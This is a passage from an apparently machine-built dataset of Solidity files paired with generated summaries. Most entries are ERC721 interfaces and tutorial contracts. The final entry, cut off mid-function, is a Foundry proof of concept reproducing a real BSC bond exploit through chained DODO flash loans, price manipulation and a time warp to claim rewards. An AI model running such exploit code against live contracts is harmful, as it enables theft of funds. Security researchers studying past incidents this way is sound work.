Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes calldata data\n    ) external;\n}\n",
        "summary": "This code defines an interface for an ERC721 compliant contract. ERC721 is a standard for non-fungible tokens (NFTs) on the Ethereum blockchain. The interface provides methods for token transfers, approvals for token transfers, and operator approvals for managing all of a user's tokens. It also includes events for the transfer and approval of tokens. The methods all have specific requirements and emit events when executed. The code imports the IERC165 interface, which is required for ERC165 support.",
        "id": "d6edf7a1-fec5-492f-91f4-42ada1982e10"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// ERC721A Contracts v4.2.3\n// Creator: Chiru Labs\n\npragma solidity ^0.8.4;\n\nimport '../IERC721A.sol';\n",
        "summary": "This code defines a contract that imports IERC721A and has a version of 4.2.3. It uses the MIT license and was created by Chiru Labs.",
        "id": "ae6f3acd-fd6d-4ceb-8192-b1733b04990e"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// ERC721A Contracts v4.2.3\n// Creator: Chiru Labs\n\npragma solidity ^0.8.4;\n\nimport '../extensions/IERC721ABurnable.sol';\n",
        "summary": "This code imports a Solidity extension for a burnable ERC721 contract, which allows a user to permanently remove a token from circulation. The code also includes information about the license under which it is being distributed and the version of the ERC721 contract being used.",
        "id": "29ad78c8-3fc5-474c-807a-a8fe77fad96a"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// ERC721A Contracts v4.2.3\n// Creator: Chiru Labs\n\npragma solidity ^0.8.4;\n\nimport '../extensions/IERC721AQueryable.sol';\n",
        "summary": "This code imports the IERC721AQueryable.sol file from the \"extensions\" folder and is using the Solidity compiler version 0.8.4. The SPDX-License-Identifier is set to MIT and the creator is Chiru Labs. There is no further code present in this file to summarize.",
        "id": "2ff13e28-b1d0-4df6-8e6a-583f701f6e6c"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC721.sol\";\n\n/**\n * @title ERC-721 Non-Fungible Token Standard, optional metadata extension\n * @dev See https://eips.ethereum.org/EIPS/eip-721\n */\ninterface IERC721Metadata is IERC721 {\n    /**\n     * @dev Returns the token collection name.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the token collection symbol.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.\n     */\n    function tokenURI(uint256 tokenId) external view returns (string memory);\n}\n",
        "summary": "This code defines an interface for the ERC721 non-fungible token standard with an optional metadata extension. It imports the IERC721 interface and declares three functions for returning the token name, symbol, and Uniform Resource Identifier (URI) for a given token ID.",
        "id": "3dfd2c07-0258-48b0-96eb-bd6a378e8d9c"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @title ERC721 token receiver interface\n * @dev Interface for any contract that wants to support safeTransfers\n * from ERC721 asset contracts.\n */\ninterface IERC721Receiver {\n    /**\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\n     * by `operator` from `from`, this function is called.\n     *\n     * It must return its Solidity selector to confirm the token transfer.\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\n     *\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\n     */\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n",
        "summary": "This is an interface for an ERC721 token receiver, which is a contract that wants to support safe transfers from ERC721 asset contracts. It contains a function called `onERC721Received` which is called whenever an ERC721 token is transferred to this contract by an operator from an address. The function must return a Solidity selector to confirm the token transfer, and if any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.",
        "id": "8743b61d-bb00-4456-816c-6fdbe6817089"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface IMath {\n    function uint256_average(\n        uint256 x,\n        uint256 y\n    ) external pure returns (uint256);\n\n    function int256_average(int256 x, int256 y) external pure returns (int256);\n\n    function ceil_div(uint256 x, uint256 y) external pure returns (uint256);\n\n    function is_negative(int256 x) external pure returns (bool);\n\n    function mul_div(\n        uint256 x,\n        uint256 y,\n        uint256 denominator,\n        bool roundup\n    ) external pure returns (uint256);\n\n    function log_2(uint256 x, bool roundup) external pure returns (uint256);\n\n    function log_10(uint256 x, bool roundup) external pure returns (uint256);\n\n    function log_256(uint256 x, bool roundup) external pure returns (uint256);\n\n    function wad_ln(int256 x) external pure returns (int256);\n\n    function wad_exp(int256 x) external pure returns (int256);\n\n    function cbrt(uint256 x, bool roundup) external pure returns (uint256);\n\n    function wad_cbrt(uint256 x) external pure returns (uint256);\n}\n",
        "summary": "This code defines an interface called `IMath`, which includes several pure functions that perform mathematical calculations such as average, division, logarithms, and cube root operations. The interface can be implemented by other smart contracts. The SPDX-License-Identifier specifies the license agreement. The pragma directive specifies the Solidity compiler version used.",
        "id": "18be1709-1593-4696-8a03-b938b67c5e79"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface IMerkleProofVerification {\n    function verify(\n        bytes32[] calldata proof,\n        bytes32 root,\n        bytes32 leaf\n    ) external pure returns (bool);\n\n    function multi_proof_verify(\n        bytes32[] calldata proof,\n        bool[] calldata proofFlags,\n        bytes32 root,\n        bytes32[] calldata leaves\n    ) external pure returns (bool);\n}\n",
        "summary": "This code defines an interface called \"IMerkleProofVerification\" that has two functions named \"verify\" and \"multi_proof_verify\". The \"verify\" function takes in three parameters of type bytes32 and returns a boolean value. The \"multi_proof_verify\" function takes in four parameters of different types and returns a boolean value. The interface is meant to be implemented by other contracts, which will provide their own logic for these functions. The SPDX-License-Identifier and pragma directives define the license of the code and the minimum version of Solidity required.",
        "id": "2ac791ab-e46c-4693-8904-14377c81fc87"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// \u901a\u8fc7\u6587\u4ef6\u76f8\u5bf9\u4f4d\u7f6eimport\nimport './Yeye.sol';\n// \u901a\u8fc7`\u5168\u5c40\u7b26\u53f7`\u5bfc\u5165\u7279\u5b9a\u7684\u5408\u7ea6\nimport {Yeye} from './Yeye.sol';\n// \u901a\u8fc7\u7f51\u5740\u5f15\u7528\nimport 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol';\n// \u5f15\u7528oppenzepplin\u5408\u7ea6\nimport '@openzeppelin/contracts/access/Ownable.sol';\n\ncontract Import {\n    // \u6210\u529f\u5bfc\u5165Address\u5e93\n    using Address for address;\n    // \u58f0\u660eyeye\u53d8\u91cf\n    Yeye yeye = new Yeye();\n\n    // \u6d4b\u8bd5\u662f\u5426\u80fd\u8c03\u7528yeye\u7684\u51fd\u6570\n    function test() external{\n        yeye.hip();\n    }\n}\n",
        "summary": "This code is a Solidity contract that imports several other contracts using different methods. The first two imports use relative file paths, while the third import uses a URL to import a specific package. The last import is from the OpenZeppelin library and imports the Ownable contract. The contract also uses the Address library via the `using` keyword and declares a variable yeye as an instance of a contract called Yeye. Finally, the `test()` function is defined to call the `hip()` function of the `yeye` variable.",
        "id": "8b41e898-34e6-40b5-9769-5d4416974bbc"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface IMulticall {\n    struct Batch {\n        address target;\n        bool allowFailure;\n        bytes callData;\n    }\n\n    struct BatchValue {\n        address target;\n        bool allowFailure;\n        uint256 value;\n        bytes callData;\n    }\n\n    struct BatchSelf {\n        bool allowFailure;\n        bytes callData;\n    }\n\n    struct BatchValueSelf {\n        bool allowFailure;\n        uint256 value;\n        bytes callData;\n    }\n\n    struct Result {\n        bool success;\n        bytes returnData;\n    }\n\n    function multicall(\n        Batch[] calldata batch\n    ) external returns (Result[] memory results);\n\n    function multicall_value(\n        BatchValue[] calldata batchValue\n    ) external payable returns (Result[] memory results);\n\n    function multicall_self(\n        BatchSelf[] calldata batchSelf\n    ) external returns (Result[] memory results);\n\n    function multicall_value_self(\n        BatchValueSelf[] calldata batchValueSelf\n    ) external payable returns (Result[] memory results);\n\n    function multistaticcall(\n        Batch[] calldata batch\n    ) external pure returns (Result[] memory results);\n}\n",
        "summary": "This is an interface for a smart contract that provides functions for batch execution of different types of calls, including value transfers and self-calls. The interface defines several structs and functions that can be used to execute multiple function calls efficiently in a single transaction. This is achieved by grouping multiple calls into batches, which are then executed together. The interface also includes a function for static batch execution, which returns the result of each call without modifying the state of the blockchain. The license used for this code is the WTF Public License.",
        "id": "7b666077-4488-484a-bce0-260cc1ea756a"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  event Transfer(address indexed sender, address indexed recipient, uint256 amount);\n}\n",
        "summary": "This code defines a Solidity contract called MyContract with an event called Transfer. The event includes three parameters: sender\u2019s address, recipient\u2019s address, and the amount transferred. The indexed keyword indicates that these parameters can be used to filter the events.",
        "id": "e03b01d6-73b7-40ea-8634-9db98668bf46"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function loop() {\n    /* `i` will have max a max value of 255 (initialized as uint8),\n     * causing an infinite loop.\n     */\n    for (var i = 0; i < 1000; i++) {\n\n    }\n  }\n}\n",
        "summary": "This is a Solidity smart contract with a `loop()` function that includes a `for` loop that initializes a variable `i` to 0 and conditionally increases it by one until it reaches a maximum value of 255 due to the uint8 data type. The loop has no functionality other than to run indefinitely due to the maximum value of `i` being exceeded before the loop exits.",
        "id": "1505695c-6df4-49fb-ab96-b842773f619a"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// \u5408\u7ea6\u7ee7\u627f\ncontract Yeye {\n    event Log(string msg);\n\n    // \u5b9a\u4e493\u4e2afunction: hip(), pop(), man()\uff0cLog\u503c\u4e3aYeye\u3002\n    function hip() public virtual{\n        emit Log(\"Yeye\");\n    }\n\n    function pop() public virtual{\n        emit Log(\"Yeye\");\n    }\n\n    function yeye() public virtual {\n        emit Log(\"Yeye\");\n    }\n}\n\ncontract Baba is Yeye{\n    // \u7ee7\u627f\u4e24\u4e2afunction: hip()\u548cpop()\uff0c\u8f93\u51fa\u6539\u4e3aBaba\u3002\n    function hip() public virtual override{\n        emit Log(\"Baba\");\n    }\n\n    function pop() public virtual override{\n        emit Log(\"Baba\");\n    }\n\n    function baba() public virtual{\n        emit Log(\"Baba\");\n    }\n}\n\ncontract Erzi is Yeye, Baba{\n    // \u7ee7\u627f\u4e24\u4e2afunction: hip()\u548cpop()\uff0c\u8f93\u51fa\u6539\u4e3aErzi\u3002\n    function hip() public virtual override(Yeye, Baba){\n        emit Log(\"Erzi\");\n    }\n\n    function pop() public virtual override(Yeye, Baba) {\n        emit Log(\"Erzi\");\n    }\n\n    function callParent() public{\n        Yeye.pop();\n    }\n\n    function callParentSuper() public{\n        super.pop();\n    }\n}\n\n// \u6784\u9020\u51fd\u6570\u7684\u7ee7\u627f\nabstract contract A {\n    uint public a;\n\n    constructor(uint _a) {\n        a = _a;\n    }\n}\n\ncontract B is A(1) {\n}\n\ncontract C is A {\n    constructor(uint _c) A(_c * _c) {}\n}\n",
        "summary": "This code defines three Solidity contracts (`Yeye`, `Baba`, and `Erzi`) that demonstrate function overrides and constructor inheritance. The `Yeye` contract defines three virtual functions that emit a log message. The `Baba` contract inherits from `Yeye` and overrides the implementation of two of its virtual functions to emit a different log message. The `Erzi` contract inherits from both `Yeye` and `Baba`, and overrides the implementation of the same two virtual functions to emit a different log message again. Additionally, `Erzi` defines two new functions that can call the parent implementation of one of the overridden functions, one explicitly and one using the `super` keyword.\n\nThere are also two additional contracts (`A` and `C`) that show how constructors can be inherited and modified. The `A` contract defines a constructor that sets a public variable `a`. The `B` contract inherits from `A` and calls its constructor with an argument of 1. The `C` contract inherits from `A` and defines its own constructor that takes an argument `_c`. It calls the `A` constructor with the value `_c * _c`.",
        "id": "9a0f9163-ceee-4df9-b0cb-b4e045112bab"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract InitialValue {\n    // Value Types\n    bool public _bool; // false\n    string public _string; // \"\"\n    int public _int; // 0\n    uint public _uint; // 0\n    address public _address; // 0x0000000000000000000000000000000000000000\n\n    enum ActionSet { Buy, Hold, Sell}\n    ActionSet public _enum; // \u7b2c\u4e00\u4e2a\u5143\u7d20 0\n\n    function fi() internal{} // internal\u7a7a\u767d\u65b9\u7a0b \n    function fe() external{} // external\u7a7a\u767d\u65b9\u7a0b \n\n    // Reference Types\n    uint[8] public _staticArray; // \u6240\u6709\u6210\u5458\u8bbe\u4e3a\u5176\u9ed8\u8ba4\u503c\u7684\u9759\u6001\u6570\u7ec4[0,0,0,0,0,0,0,0]\n    uint[] public _dynamicArray; // `[]`\n    mapping(uint => address) public _mapping; // \u6240\u6709\u5143\u7d20\u90fd\u4e3a\u5176\u9ed8\u8ba4\u503c\u7684mapping\n    // \u6240\u6709\u6210\u5458\u8bbe\u4e3a\u5176\u9ed8\u8ba4\u503c\u7684\u7ed3\u6784\u4f53 0, 0\n    struct Student{\n        uint256 id;\n        uint256 score; \n    }\n    Student public student;\n\n    // delete\u64cd\u4f5c\u7b26\n    bool public _bool2 = true; \n    function d() external {\n        delete _bool2; // delete \u4f1a\u8ba9_bool2\u53d8\u4e3a\u9ed8\u8ba4\u503c\uff0cfalse\n    }\n}\n",
        "summary": "This Solidity code defines a smart contract named \"InitialValue\" that includes various value and reference types with their default values. The contract defines a series of public variables including bool, string, int, uint, address, enum, static and dynamic arrays, a mapping, and a struct. The mapping and struct have all their members set to default values. The contract also includes two blank functions, one internal and one external, and a function that utilizes the delete operator to set a boolean variable to its default value. Additionally, the SPDX-License-Identifier is set to MIT.",
        "id": "f272872c-7159-465a-b71e-881a3bae9c44"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\ncontract InsertionSort {\n    // if else\n    function ifElseTest(uint256 _number) public pure returns(bool){\n        if(_number == 0){\n            return(true);\n        }else{\n            return(false);\n        }\n    }\n\n    // for loop\n    function forLoopTest() public pure returns(uint256){\n        uint sum = 0;\n        for(uint i = 0; i < 10; i++){\n            sum += i;\n        }\n        return(sum);\n    }\n\n    // while\n    function whileTest() public pure returns(uint256){\n        uint sum = 0;\n        uint i = 0;\n        while(i < 10){\n            sum += i;\n            i++;\n        }\n        return(sum);\n    }\n\n    // do-while\n    function doWhileTest() public pure returns(uint256){\n        uint sum = 0;\n        uint i = 0;\n        do{\n            sum += i;\n            i++;\n        }while(i < 10);\n        return(sum);\n    }\n\n    // \u4e09\u5143\u8fd0\u7b97\u7b26 ternary/conditional operator\n    function ternaryTest(uint256 x, uint256 y) public pure returns(uint256){\n        // return the max of x and y\n        return x >= y ? x: y; \n    }\n\n\n    // \u63d2\u5165\u6392\u5e8f \u9519\u8bef\u7248\n    function insertionSortWrong(uint[] memory a) public pure returns(uint[] memory) {\n        // note that uint can not take negative value\n        for (uint i = 1;i < a.length;i++){\n            uint temp = a[i];\n            uint j=i-1;\n            while( (j >= 0) && (temp < a[j])){\n                a[j+1] = a[j];\n                j--;\n            }\n            a[j+1] = temp;\n        }\n        return(a);\n    }\n\n    // \u63d2\u5165\u6392\u5e8f \u6b63\u786e\u7248\n    function insertionSort(uint[] memory a) public pure returns(uint[] memory) {\n        // note that uint can not take negative value\n        for (uint i = 1;i < a.length;i++){\n            uint temp = a[i];\n            uint j=i;\n            while( (j >= 1) && (temp < a[j-1])){\n                a[j] = a[j-1];\n                j--;\n            }\n            a[j] = temp;\n        }\n        return(a);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that defines functions for various types of loops (if-else, for loop, while, do-while) and an implementation of the insertion sort algorithm. \n\nThe ifElseTest function takes a uint256 input and returns true if the input is 0, otherwise false.\n\nThe forLoopTest function returns the sum of the integers from 0 to 9 using a for loop.\n\nThe whileTest and doWhileTest functions both return the sum of the integers from 0 to 9 using a while loop and do-while loop respectively.\n\nThe ternaryTest function takes two uint256 inputs and returns the max of the two inputs using a ternary operator.\n\nThe insertionSortWrong function implements an incorrect version of the insertion sort algorithm, and the insertionSort function implements the correct version of the algorithm. Both functions take an array of uints as input and return the sorted array.",
        "id": "46b40876-c861-4a9e-9479-a2cb9ecd0e1a"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nabstract contract InsertionSort{\n    function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory);\n}\n\nimport \"@openzeppelin/contracts/utils/introspection/IERC165.sol\";\n\ninterface IERC721 is IERC165 {\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n    \n    function balanceOf(address owner) external view returns (uint256 balance);\n\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\n\n    function transferFrom(address from, address to, uint256 tokenId) external;\n\n    function approve(address to, uint256 tokenId) external;\n\n    function getApproved(uint256 tokenId) external view returns (address operator);\n\n    function setApprovalForAll(address operator, bool _approved) external;\n\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n\n    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;\n}\n\ncontract interactBAYC {\n    // \u5229\u7528BAYC\u5730\u5740\u521b\u5efa\u63a5\u53e3\u5408\u7ea6\u53d8\u91cf\uff08ETH\u4e3b\u7f51\uff09\n    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);\n\n    // \u901a\u8fc7\u63a5\u53e3\u8c03\u7528BAYC\u7684balanceOf()\u67e5\u8be2\u6301\u4ed3\u91cf\n    function balanceOfBAYC(address owner) external view returns (uint256 balance){\n        return BAYC.balanceOf(owner);\n    }\n\n    // \u901a\u8fc7\u63a5\u53e3\u8c03\u7528BAYC\u7684safeTransferFrom()\u5b89\u5168\u8f6c\u8d26\n    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external{\n        BAYC.safeTransferFrom(from, to, tokenId);\n    }\n}\n",
        "summary": "This code defines a contract `InsertionSort` with a single `insertionSort` function that takes in an array of uint and sorts it in ascending order, using the insertion sort algorithm. The `IERC721` interface is imported from the OpenZeppelin library and contains functions for managing non-fungible tokens (NFTs). The `interactBAYC` contract uses the `IERC721` interface to interact with a specific NFT, Bored Ape Yacht Club (BAYC). It has two functions, `balanceOfBAYC` which returns the number of BAYC tokens owned by an address and `safeTransferFromBAYC` which transfers a specified BAYC token from one address to another using a safe transfer method. The contract includes a SPDX-License-Identifier declaration at the top indicating that it is licensed under the MIT license.",
        "id": "2492747a-dca4-41d3-818b-2955df2475e9"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\ninterface Base {\n    function getFirstName() external pure returns(string memory);\n    function getLastName() external pure returns(string memory);\n}\ncontract BaseImpl is Base{\n    function getFirstName() external pure override returns(string memory){\n        return \"Amazing\";\n    }\n    function getLastName() external pure override returns(string memory){\n        return  \"Ang\";\n    }\n}\n",
        "summary": "This is a Solidity smart contract that defines an interface, `Base`, and a contract implementing that interface, `BaseImpl`. The contract implements two functions from the interface: `getFirstName()` and `getLastName()`. These functions return strings with predetermined values. The code uses the `override` and `pure` keywords to indicate that the functions are overriding their implementations in the interface and don't modify any state.",
        "id": "290c1da0-d0fc-4014-8e64-87c866238276"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1587848874076430336\n// @Address\n// https://bscscan.com/txs?a=0xb12011c14e087766f30f4569ccaf735ec2182165\n\ninterface Bond {\n    function buyBond(uint256 lpAmount, uint256 bondId) external;\n    function claim(uint256 index) external;\n}\n\ninterface VBUSD {\n    function mint(uint256 mintAmount) external;\n    function redeemUnderlying(uint256 redeemAmount) external;\n}\n\ninterface VBNB {\n    function mint() payable external;\n    function redeemUnderlying(uint256 redeemAmount) external;\n}\n\ninterface VETH {\n    function mint(uint256 mintAmount) external;\n    function redeemUnderlying(uint256 redeemAmount) external;\n}\n\ninterface VBTC {\n    function mint(uint256 mintAmount) external;\n    function redeemUnderlying(uint256 redeemAmount) external;\n}\n\ninterface VUSDT {\n    function borrow(uint256 borrowAmount) external;\n    function repayBorrow(uint256 repayAmount) external;\n}\n\ninterface Unitroller {\n    function getAccountLiquidity(address account) external returns(uint, uint, uint);  \n    function enterMarkets(address[] calldata vTokens) external;   \n}\n\ncontract ContractTest is DSTest{\n    IERC20 INUKO = IERC20(0xEa51801b8F5B88543DdaD3D1727400c15b209D8f);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);\n    IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xD50B9Bcd8B7D4B791EA301DBCC8318EE854d8B67);\n    VBNB vBNB = VBNB(0xA07c5b74C9B40447a954e1466938b865b6BBea36);\n    VBUSD vBUSD = VBUSD(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);\n    VETH vETH = VETH(0xf508fCD89b8bd15579dc79A6827cB4686A3592c8);\n    VBTC vBTC = VBTC(0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B);\n    VUSDT vUSDT = VUSDT(0xfD5840Cd36d94D7229439859C0112a4185BC0255);\n    Unitroller unitroller = Unitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);\n    IERC20 token1;\n    IERC20 token2;\n    uint amount1;\n    uint amount2;\n    uint amount3;\n    uint amount4;\n    uint amount5;\n    uint amount6;\n    uint amount7;\n    uint amount8;\n    uint amount9;\n    uint amount10;\n    uint amount11;\n    uint amount12;\n    uint amount13;\n    uint amount14;\n    uint amount15;\n    uint amount16;\n    address constant dodo1 = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;\n    address constant dodo2 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    address constant dodo3 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;\n    address constant dodo4 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;\n    address constant dodo5 = 0x7A3F460F37AE8A8FF2C2440B8A8ee784cCD0B543;\n    address constant dodo6 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n    address constant dodo7 = 0x9BA8966B706c905E594AcbB946Ad5e29509f45EB;\n    address constant dodo8 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;\n    Bond bond = Bond(0x09beDDae85a9b5Ada57a5bd7979bb7b3dd08B538);\n\n    \n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        // the ankr rpc maybe dont work , please use QuickNode \n        cheats.createSelectFork(\"bsc\", 22169169);\n    }\n\n    function testExploit() public payable{\n        address(WBNB).call{value: 5 ether}(\"\");\n        // add LP\n        addLiquidity();\n        // FlashLoan manipulate price, then buy bond\n        buyBond();\n        // change time pass time check , claim reward\n        cheats.warp(block.timestamp + 3 * 24 * 60 * 60);\n        claimAndSell();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function addLiquidity() internal {\n        WBNB.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](3);\n        path[0] = address(WBNB);\n        path[1] = address(USDT);\n        path[2] = address(INUKO);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)) / 2,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n\n        address [] memory path1 = new address[](2);\n        path1[0] = address(WBNB);\n        path1[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path1,\n            address(this),\n            block.timestamp\n        );\n\n        USDT.approve(address(Router), type(uint).max);\n        INUKO.approve(address(Router), type(uint).max);\n        Router.addLiquidity(\n            address(USDT),\n            address(INUKO),\n            USDT.balanceOf(address(this)),\n            INUKO.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n\n        Pair.approve(address(bond), type(uint).max);\n    }\n\n    function buyBond() internal{\n        token1 = IERC20(DVM(dodo1)._BASE_TOKEN_());\n        token2 = IERC20(DVM(dodo1)._QUOTE_TOKEN_());\n        amount1 =token1.balanceOf(dodo1);\n        amount2 = token2.balanceOf(dodo1);\n        DVM(dodo1).flashLoan(amount1, amount2, address(this), new bytes(1)); //WBNB USDT\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) payable external{     \n        if(msg.sender == dodo1){\n            WBNB_BUSD_Pair_Loan();\n        }\n        else if(msg.sender == dodo2){\n            ETH_USDT_Pair_Loan1();\n        }\n        else if(msg.sender == dodo3){\n            WBNB_USDT_Pair_Loan();\n        }\n        else if(msg.sender == dodo4){\n            BTCB_BUSD_Pair_Loan();\n        }\n        else if(msg.sender == dodo5){\n            ETH_USDT_Pair_Loan2();\n        }\n        else if(msg.sender == dodo6){\n            ETH_BUSD_Pair_Loan();\n        }\n        else if(msg.sender == dodo7){\n            BTCB_USDT_Pair_Loan();\n        }\n        else if(msg.sender == dodo8){\n            venusLendingAndRepay();\n            BTCB.transfer(dodo8, amount15);\n            USDT.transfer(dodo8, amount16);\n        }\n    \n    }\n\n    function WBNB_BUSD_Pair_Loan() internal{\n        token1 = IERC20(DVM(dodo2)._BASE_TOKEN_());\n        token2 = IERC20(DVM(dodo2)._QUOTE_TOKEN_());\n        amount3 = token1.balanceOf(dodo2);\n        amount4 = token2.balanceOf(dodo2);\n        DVM(dodo2).flashLoan(amount3, amount4, address(this), new bytes(1));\n        WBNB.transfer(dodo1, amount1);\n        USDT.transfer(dodo1, amount2);\n    }\n\n    function ETH_USDT_Pair_Loan1() internal{\n        token1 = IERC20(DVM(dodo3)._BASE_TOKEN_());\n        token2 = IERC20(DVM(dodo3)._QUOTE_TOKEN_());\n        amount5 = token1.balanceOf(dodo3);\n        amount6 = token2.balanceOf(dodo3);\n        DVM(dodo3).flashLoan(amount5, amount6, address(this), new bytes(1)); \n        WBNB.transfer(dodo2, amount3);\n        BUSD.transfer(dodo2, amount4);\n    }\n\n    function WBNB_USDT_Pair_Loan() internal{\n        token1 = IERC20(DVM(dodo4)._BASE_TOKEN_());\n        token2 = IERC20(DVM(dodo4)._QUOTE_TOKEN_());\n        amount7 = token1.balanceOf(dodo4);\n        amount8 = token2.balanceOf(dodo4);\n        DVM(dodo4).flashLoan(amount7, amount8, address(this), new bytes(1)); \n        ETH.transfer(dodo3, amount5);\n        USDT.transfer(dodo3, amount6);\n    }\n\n    function BTCB_BUSD_Pair_Loan() internal{\n        token1 = IERC20(DVM(dodo5)._BASE_TOKEN_());\n        token2 = IERC20(DVM(dodo5)._QUOTE_TOKEN_());\n        amount9 = token1.balanceOf(dodo5);\n        amount10 = token2.balanceOf(dodo5);\n        DVM(dodo5).flashLoan(amount9, amount10, address(this), new bytes(1)); \n        WBNB.transfer(dodo4, amount7);\n        USDT.transfer(dodo4, amount8);\n    }\n\n    function ETH_USDT_Pair_Loan2() internal{\n        token1 = IERC20(DVM(dodo6)._BASE_TOKEN_());\n        token2 = IERC20(DVM(dodo6)._QUOTE_TOKEN_());\n        amount11 = token1.balanceOf(dodo6);\n        amount12 = token2.balanceOf(dodo6);\n        DVM(dodo6).flashLoan(amount11, amount12, address(this), new bytes(1)); \n        BTCB.transfer(dodo5, amount9);\n        BUSD.transfer(dodo5, amount10);\n    }\n\n    function ETH_BUSD_Pair_Loan() internal{\n        token1 = IERC20(DVM(dodo7)._BASE_TOKEN_());\n        token2 = IERC20(DVM(dodo7)._QUOTE_TOKEN_());\n        amount13 = token1.balanceOf(dodo7);\n        amount14 = token2.balanceOf(dodo7);\n        DVM(dodo7).flashLoan(amount13, amount14, address(this), new bytes(1)); // WBNB BUSD\n        ETH.transfer(dodo6, amount11);\n        USDT.transfer(dodo6, amount12);\n    }\n\n    function BTCB_USDT_Pair_Loan() internal{\n        token1 = IERC20(DVM(dodo8)._BASE_TOKEN_());\n        token2 = IERC20(DVM(dodo8)._QUOTE_TOKEN_());\n        amount15 = token1.balanceOf(dodo8);\n        amount16 = token2.balanceOf(dodo8);\n        DVM(dodo8).flashLoan(amount15, amount16, address(this), new bytes(1)); // WBNB BUSD\n        ETH.transfer(dodo7, amount13);\n        BUSD.transfer(dodo7, amount14);\n    }\n\n    function venusLendingAndRepay() payable public {\n        uint BNBAmount = 